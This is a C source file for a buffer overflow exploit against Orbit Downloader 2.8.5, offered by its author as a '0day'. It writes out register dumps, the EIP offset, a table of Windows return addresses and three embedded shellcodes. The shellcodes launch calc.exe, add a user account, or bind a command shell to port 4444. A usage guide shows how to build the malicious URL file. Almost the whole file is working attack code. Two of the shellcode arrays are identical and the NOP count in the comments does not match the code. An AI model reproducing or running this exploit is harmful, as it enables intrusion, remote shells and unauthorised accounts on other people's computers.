/*0day orbit_expl.c*/
/*Orbit Downloader V2.8.5 Malformed URL Buffer Overflow Exploit*/
/*Bug found by fl0 fl0w ,exploit programmed by fl0 fl0w*/

/*Click NEW and copy paste each line into the URL field.
  Important copy paste one line at the time cause it wouln't allow you to copy more than 100 caracters at
  once,so be patient.
***************************SPRAY THE STACK*****************************************************************
*AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA     *
*CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC     *
*BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB     *
*DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD     *
*FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF     *
*LVVBXUUXXGGGMMMMGGTGGJJJJJJGYGGEEEEEEGRGGGGGGGGGOGGGGGGGGGLGGGGGGGGGZGGGGGGGGGAGGGGGGGGGSGGGGGGGGGCC     *
*        10        20         30        40        50        60        70        80        90        100   *
*TTTTXAAXTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT     *
*   |EIP| = 504 bytes offset                                                                              *
*                                                                                                         *
*URL STRUCTURE                                                                                          *
* http://www. + [604 * NOP(0X90)] + [NEW EIP(JMP ESP)] +[SHELLCODE] + [0X00(1 * NULL BYTE)]               *
***********************************************************************************************************
EAX 00000001
ECX 46464646 ->overwriten
EDX 7C90E4F4 ntdll.KiFastSystemCallRet
EBX 00BD3AD0
ESP 0140F574 ASCII "XGGGMMMMGGTGGJJJJJJGYGGEEEEEEGRGGGGGGGGGOGGGGGGGGGLGGGGGGGGGZGGGGGGGGGAGGGGGGGGGSGGGGGGGGGCC:80"
EBP 00BD3AF0
ESI 00BD4020
EDI 00CC4360 download.00CC4360
EIP 58555558 ->overwriten

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#define SIZE 10000
#define OFFSET 504

void file (char * , char *);
void write (char *, int ,char *);
void print ();
void usage (char *);
void target ();
                   /*tnx Metasploit for Shellcodes*/
//LAUNCH CALC.EXE   
                            char shellcode_1[] =
                                               "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
                                               "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x37\x6a\x63"
                                               "\x58\x30\x42\x30\x50\x42\x6b\x42\x41\x73\x41\x42\x32\x42\x41\x32"
                                               "\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x38\x69\x69\x6c\x38"
                                               "\x68\x41\x54\x77\x70\x57\x70\x75\x50\x6e\x6b\x41\x55\x55\x6c\x6e"
                                               "\x6b\x43\x4c\x66\x65\x41\x68\x45\x51\x58\x6f\x4c\x4b\x50\x4f\x62"
                                               "\x38\x6e\x6b\x41\x4f\x31\x30\x36\x61\x4a\x4b\x41\x59\x6c\x4b\x74"
                                               "\x74\x6e\x6b\x44\x41\x4a\x4e\x47\x41\x4b\x70\x6f\x69\x6c\x6c\x4c"
                                               "\x44\x4b\x70\x43\x44\x76\x67\x4b\x71\x4a\x6a\x66\x6d\x66\x61\x39"
                                               "\x52\x5a\x4b\x4a\x54\x75\x6b\x62\x74\x56\x44\x73\x34\x41\x65\x4b"
                                               "\x55\x4e\x6b\x73\x6f\x54\x64\x53\x31\x6a\x4b\x35\x36\x6c\x4b\x64"
                                               "\x4c\x30\x4b\x6c\x4b\x73\x6f\x57\x6c\x75\x51\x6a\x4b\x6c\x4b\x37"
                                               "\x6c\x6c\x4b\x77\x71\x68\x6b\x4c\x49\x71\x4c\x51\x34\x43\x34\x6b"
                                               "\x73\x46\x51\x79\x50\x71\x74\x4c\x4b\x67\x30\x36\x50\x4c\x45\x4b"
                                               "\x70\x62\x58\x74\x4c\x6c\x4b\x53\x70\x56\x6c\x4e\x6b\x34\x30\x47"
                                               "\x6c\x4e\x4d\x6c\x4b\x70\x68\x37\x78\x58\x6b\x53\x39\x6c\x4b\x4f"
                                               "\x70\x6c\x70\x53\x30\x43\x30\x73\x30\x6c\x4b\x42\x48\x77\x4c\x61"
                                               "\x4f\x44\x71\x6b\x46\x73\x50\x72\x76\x6b\x39\x5a\x58\x6f\x73\x4f"
                                               "\x30\x73\x4b\x56\x30\x31\x78\x61\x6e\x6a\x78\x4b\x52\x74\x33\x55"
                                               "\x38\x4a\x38\x69\x6e\x6c\x4a\x54\x4e\x52\x77\x79\x6f\x79\x77\x42"
                                               "\x43\x50\x61\x70\x6c\x41\x73\x64\x6e\x51\x75\x52\x58\x31\x75\x57"
                                                                                                                                            "\x70\x63";

//ADD USER
                                                char shellcode_2[ ]=
                                                                    "\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x50"
                                                                    "\x8a\xfa\x90\x83\xeb\xfc\xe2\xf4\xac\xe0\x11\xdd\xb8\x73\x05\x6f"
                                                                    "\xaf\xea\x71\xfc\x74\xae\x71\xd5\x6c\x01\x86\x95\x28\x8b\x15\x1b"
                                                                    "\x1f\x92\x71\xcf\x70\x8b\x11\xd9\xdb\xbe\x71\x91\xbe\xbb\x3a\x09"
                                                                    "\xfc\x0e\x3a\xe4\x57\x4b\x30\x9d\x51\x48\x11\x64\x6b\xde\xde\xb8"
                                                                    "\x25\x6f\x71\xcf\x74\x8b\x11\xf6\xdb\x86\xb1\x1b\x0f\x96\xfb\x7b"
                                                                    "\x53\xa6\x71\x19\x3c\xae\xe6\xf1\x93\xbb\x21\xf4\xdb\xc9\xca\x1b"
                                                                    "\x10\x86\x71\xe0\x4c\x27\x71\xd0\x58\xd4\x92\x1e\x1e\x84\x16\xc0"
                                                                    "\xaf\x5c\x9c\xc3\x36\xe2\xc9\xa2\x38\xfd\x89\xa2\x0f\xde\x05\x40"
                                                                    "\x38\x41\x17\x6c\x6b\xda\x05\x46\x0f\x03\x1f\xf6\xd1\x67\xf2\x92"
                                                                    "\x05\xe0\xf8\x6f\x80\xe2\x23\x99\xa5\x27\xad\x6f\x86\xd9\xa9\xc3"
                                                                    "\x03\xd9\xb9\xc3\x13\xd9\x05\x40\x36\xe2\xeb\xcc\x36\xd9\x73\x71"
                                                                    "\xc5\xe2\x5e\x8a\x20\x4d\xad\x6f\x86\xe0\xea\xc1\x05\x75\x2a\xf8"
                                                                    "\xf4\x27\xd4\x79\x07\x75\x2c\xc3\x05\x75\x2a\xf8\xb5\xc3\x7c\xd9"
                                                                    "\x07\x75\x2c\xc0\x04\xde\xaf\x6f\x80\x19\x92\x77\x29\x4c\x83\xc7"
                                                                    "\xaf\x5c\xaf\x6f\x80\xec\x90\xf4\x36\xe2\x99\xfd\xd9\x6f\x90\xc0"
                                                                    "\x09\xa3\x36\x19\xb7\xe0\xbe\x19\xb2\xbb\x3a\x63\xfa\x74\xb8\xbd"
                                                                    "\xae\xc8\xd6\x03\xdd\xf0\xc2\x3b\xfb\x21\x92\xe2\xae\x39\xec\x6f"
                                                                    "\x25\xce\x05\x46\x0b\xdd\xa8\xc1\x01\xdb\x90\x91\x01\xdb\xaf\xc1"
                                                                    "\xaf\x5a\x92\x3d\x89\x8f\x34\xc3\xaf\x5c\x90\x6f\xaf\xbd\x05\x40"
                                                                    "\xdb\xdd\x06\x13\x94\xee\x05\x46\x02\x75\x2a\xf8\x2e\x52\x18\xe3"
                                                                    "\x03\x75\x2c\x6f\x80\x8a\xfa\x90";

//REVERSE CMD SHELL ->BIND PORT
                              char shellcode_3[] =
                                                  "\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x50"
                                                  "\x8a\xfa\x90\x83\xeb\xfc\xe2\xf4\xac\xe0\x11\xdd\xb8\x73\x05\x6f"
                                                  "\xaf\xea\x71\xfc\x74\xae\x71\xd5\x6c\x01\x86\x95\x28\x8b\x15\x1b"
                                                  "\x1f\x92\x71\xcf\x70\x8b\x11\xd9\xdb\xbe\x71\x91\xbe\xbb\x3a\x09"
                                                  "\xfc\x0e\x3a\xe4\x57\x4b\x30\x9d\x51\x48\x11\x64\x6b\xde\xde\xb8"
                                                  "\x25\x6f\x71\xcf\x74\x8b\x11\xf6\xdb\x86\xb1\x1b\x0f\x96\xfb\x7b"
                                                  "\x53\xa6\x71\x19\x3c\xae\xe6\xf1\x93\xbb\x21\xf4\xdb\xc9\xca\x1b"
                                                  "\x10\x86\x71\xe0\x4c\x27\x71\xd0\x58\xd4\x92\x1e\x1e\x84\x16\xc0"
                                                  "\xaf\x5c\x9c\xc3\x36\xe2\xc9\xa2\x38\xfd\x89\xa2\x0f\xde\x05\x40"
                                                  "\x38\x41\x17\x6c\x6b\xda\x05\x46\x0f\x03\x1f\xf6\xd1\x67\xf2\x92"
                                                  "\x05\xe0\xf8\x6f\x80\xe2\x23\x99\xa5\x27\xad\x6f\x86\xd9\xa9\xc3"
                                                  "\x03\xd9\xb9\xc3\x13\xd9\x05\x40\x36\xe2\xeb\xcc\x36\xd9\x73\x71"
                                                  "\xc5\xe2\x5e\x8a\x20\x4d\xad\x6f\x86\xe0\xea\xc1\x05\x75\x2a\xf8"
                                                  "\xf4\x27\xd4\x79\x07\x75\x2c\xc3\x05\x75\x2a\xf8\xb5\xc3\x7c\xd9"
                                                  "\x07\x75\x2c\xc0\x04\xde\xaf\x6f\x80\x19\x92\x77\x29\x4c\x83\xc7"
                                                  "\xaf\x5c\xaf\x6f\x80\xec\x90\xf4\x36\xe2\x99\xfd\xd9\x6f\x90\xc0"
                                                  "\x09\xa3\x36\x19\xb7\xe0\xbe\x19\xb2\xbb\x3a\x63\xfa\x74\xb8\xbd"
                                                  "\xae\xc8\xd6\x03\xdd\xf0\xc2\x3b\xfb\x21\x92\xe2\xae\x39\xec\x6f"
                                                  "\x25\xce\x05\x46\x0b\xdd\xa8\xc1\x01\xdb\x90\x91\x01\xdb\xaf\xc1"
                                                  "\xaf\x5a\x92\x3d\x89\x8f\x34\xc3\xaf\x5c\x90\x6f\xaf\xbd\x05\x40"
                                                  "\xdb\xdd\x06\x13\x94\xee\x05\x46\x02\x75\x2a\xf8\x2e\x52\x18\xe3"
                                                  "\x03\x75\x2c\x6f\x80\x8a\xfa\x90";
             struct {
         char *OS;
         unsigned int EIP;       
         }
Retcodes [] = { { "Microsoft Windows Pro sp3 English:", 0x7C8369F0 },/*call esp */
               { "Microsoft Windows Pro sp3 English:", 0x7C86467B },   /*jmp esp */
               { "\t\t\t  UNIVERSAL_1:", 0x1008E153 },   
               { "\t\t\t  UNIVERSAL_2:", 0x219FB9B }, 
               { "Windows 2000 5.0.1.0 SP1 (IA32) English:", 0x69952208 }, /*jmp esp*/
               { "sss", 0x7C868667} ,
             }, t;

int main(int argc, char *argv[])
   {
      int X, shell ;     
      char *L, *Z;
      char *actbuff; 
     actbuff = (char *)malloc(SIZE);
          if (argc < 3) {
                       system("cls");
                       printf("***********************************************************************\n");
                       print ();
                       usage (argv[0]);   
                       Sleep(1000);
                       printf("\n\n");
                       printf("\t\t\t\tTargets\n");
                       target();
                       printf("************************************************************************\n");
                                     exit (0);   
             }
 
                     
   L = argv[0];         
   Z = argv[1];         
   shell = atoi(argv[2]);           
   write (actbuff, shell, Z);
   file (argv[3], actbuff);
   print();
   printf("Loading ...");
   Sleep(3000);
                  printf ("File build succesfully\n");
 
   return 0;   
}   
  void target()
  {
   int i;
for (i = 0; i < sizeof(Retcodes)/sizeof(t); i++)
          printf("> %d %s <0x%.8x> \n", i, Retcodes[i].OS, Retcodes[i].EIP);
       }
void file (char *filename, char *buff)
{
    FILE *f;
 
        if ((f = fopen(filename, "wb")) == NULL) {
          printf("Error writing file\n");
                        exit(0);                     
         } 
   fwrite (buff, 1 , strlen(buff), f);
   free (buff); 
   fclose (f);
      } 
     
void write (char *buffer, int shellc_type, char *Y)
{ 
    unsigned int offset = 0;
   
   unsigned int RET = Retcodes[atoi(Y)].EIP;
    memset (buffer ,0x90, SIZE);
    offset = OFFSET;
    memcpy (buffer + offset, &RET, 4); offset += 4;
    switch (shellc_type) {
                        case 1:
                                 memcpy (buffer + offset ,shellcode_1, strlen(shellcode_1)); offset += strlen(shellcode_1);
                                 memset (buffer + offset, 0x00, 1); 
                                        break;
                                 case 2:
                                        memcpy (buffer + offset ,shellcode_2, strlen(shellcode_2)); offset += strlen(shellcode_2);
                                        memset (buffer + offset, 0x00, 1);   
                                               break;
                                        case 3:
                                                memcpy (buffer + offset ,shellcode_3, strlen(shellcode_3)); offset += strlen(shellcode_3);
                                                memset (buffer + offset, 0x00, 1);                     
                                                       break;
             } 
   
      }     
    void usage(char *K)
    {
     printf ("Usage is: %s [target] [shell_type] [filename].txt\n", K);   
     fputs (
            "\t\tRetaddress for your version of Windows\n"
            "\t\tShell_type is the type of shellcode you want to run\n"
            "\t\t\t *Press 1 To Run CALC.EXE\n"
            "\t\t\t *Press 2 To Add User\n"
            "\t\t\t *Press 3 To Bind Shell to Port 4444\n" 
            "\t\tExample\n"
            "\t\t\torbit_expl.exe 0 3 file.txt\n"
    ,stdout);
         } 
  void print()
  {
    fputs(
          "\t\tOrbit Downloader V2.8.5 Malformed URL Buffer Overflow Exploit\n"
          "\t\tby fl0 fl0w\n"
          "\t\tContact: flo_flow_supremacy@yahoo.com\n"
          "\n", stdout); 
       }
